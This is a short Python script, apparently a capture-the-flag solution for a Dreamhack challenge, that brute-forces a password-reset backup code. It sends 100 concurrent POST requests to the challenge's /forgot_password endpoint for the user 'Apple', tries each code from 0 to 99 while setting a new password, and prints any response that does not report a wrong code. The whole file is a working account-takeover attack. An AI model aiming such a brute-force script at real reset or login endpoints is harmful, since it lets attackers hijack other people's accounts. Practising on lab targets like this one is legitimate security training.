from concurrent.futures import ThreadPoolExecutor
import requests

# admin = ['Apple', 'coconut', 'lemon', 'potato', 'peach', 'orange']
found = False

def guess_code(i):
    form = {"userid": "Apple", "newpassword": "pwd", "backupCode": i}
    return requests.post("http://host3.dreamhack.games:12934/forgot_password", form)

def main():
    i = [i for i in range(100)]
    with ThreadPoolExecutor(max_workers=100) as executor:
        results = executor.map(guess_code, i)
        for result in results:
            cont = str(result.content)
            cont = cont.split('\\n')[42]
            # print(cont.lstrip()[:15])
            if cont.lstrip()[5:15] != "Wrong Back":
                print(cont)

if __name__ == "__main__":
    main()